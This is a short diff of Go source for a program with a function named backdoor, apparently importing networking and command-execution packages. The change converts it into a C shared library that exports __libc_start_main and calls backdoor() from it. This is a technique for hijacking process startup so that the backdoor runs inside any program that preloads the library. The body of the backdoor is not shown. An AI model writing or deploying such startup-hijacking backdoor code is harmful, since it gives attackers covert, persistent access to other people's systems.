@@ -1,6 +1,8 @@
 package main
 
 import (
+	"C"
+
 	"bufio"
 	"log"
 	"net"
@@ -8,8 +10,13 @@ import (
 	"os/exec"
 )
 
-func main() {
+// main is required to build a shared library, but does nothing
+func main() {}
+
+//export __libc_start_main
+func __libc_start_main() {
 	backdoor()
+
 }
 
 func backdoor() {
